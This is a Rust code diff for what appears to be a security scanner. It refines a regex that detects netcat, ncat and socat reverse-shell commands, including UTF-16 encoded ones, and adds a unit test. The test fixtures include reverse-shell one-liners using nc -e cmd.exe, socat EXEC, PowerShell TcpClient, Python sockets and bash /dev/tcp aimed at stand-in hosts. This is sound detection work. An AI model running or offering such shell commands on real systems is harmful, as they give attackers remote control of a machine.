@@ -74,6 +74,24 @@ pub(in crate::analysis) fn discovery_pattern() -> String {
     patterns.push(wide("/dev/tcp/"));
     patterns.join("|")
 }
+
+/// Keep short nc markers only when followed by printable command context.
+/// The final parser still uses the broad markers above, and longer/scripting
+/// markers retain their fallback coverage during discovery.
+pub(in crate::analysis) fn candidate_pattern() -> String {
+    let pattern = discovery_pattern();
+    let pattern = pattern.replacen(
+        r#"\b(?:ncat|netcat|nc|socat)(?:\.exe)?["']?\s+"#,
+        r#"\b(?:ncat|netcat|socat)(?:\.exe)?["']?[ \t]+|\bnc(?:\.exe)?["']?[ \t]+[\x09\x20-\x7e]{1,4096}[ \t]+["']?[0-9]{1,5}"#,
+        1,
+    );
+    // A UTF-16 command needs a complete token boundary and printable argument
+    // context containing a numeric port, just like the narrow short spelling.
+    pattern.replace(
+        r"\x6e\x00\x63\x00(?:\x2e\x00\x65\x00\x78\x00\x65\x00)?(?:\x22\x00|\x27\x00)?(?:\x20\x00|\x09\x00)+",
+        r"(?:^|[^A-Za-z0-9_\x00]\x00|[^\x00])\x6e\x00\x63\x00(?:\x2e\x00\x65\x00\x78\x00\x65\x00)?(?:\x22\x00|\x27\x00)?(?:\x20\x00|\x09\x00)+(?:[\x09\x20-\x7e]\x00){1,2048}(?:\x20\x00|\x09\x00)+(?:\x22\x00|\x27\x00)?(?:[0-9]\x00){1,5}",
+    )
+}
 pub(in crate::analysis) fn scan_text(
     bytes: &[u8],
     core: std::ops::Range<usize>,
@@ -409,6 +427,32 @@ mod tests {
         assert_eq!(rows.len(), 1);
         assert_eq!(rows[0].2, "UTF-16LE");
         assert_eq!(rows[0].3.text("Port"), "5059");
+    }
+
+    #[test]
+    fn candidate_context_rejects_short_noise_and_keeps_supported_commands() {
+        let re = regex::bytes::Regex::new(&format!("(?i-u)(?:{})", candidate_pattern())).unwrap();
+        for text in ["nc\n\x0c", "nc \0", "sync 80 443", "strnc 192.0.2.5 5059"] {
+            assert!(!re.is_match(text.as_bytes()), "{text:?}");
+            let wide: Vec<_> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
+            assert!(!re.is_match(&wide), "wide {text:?}");
+        }
+        for text in [
+            "nc 192.0.2.5 5059",
+            "nc -e cmd.exe 192.0.2.5 5059",
+            "\"C:\\tools\\nc.exe\" -nv example.test 443 -e cmd.exe",
+            "nc -p 1234 [2001:db8::5] 5059",
+            "ncat --exec=cmd.exe example.test 443",
+            "socat TCP:example.test:443 EXEC:cmd.exe",
+            "[System.Net.Sockets.TcpClient]::new('192.0.2.5',5059)",
+            "s=socket.socket();s.connect(('192.0.2.5',5059))",
+            "bash -c 'exec 3<>/dev/tcp/192.0.2.5/5059'",
+        ] {
+            assert!(!parse(text).is_empty(), "fixture must be supported: {text}");
+            assert!(re.is_match(text.as_bytes()), "{text}");
+            let wide: Vec<_> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
+            assert!(re.is_match(&wide), "wide {text}");
+        }
     }
     #[test]
     fn scripting_syntax_requires_explicit_targets() {
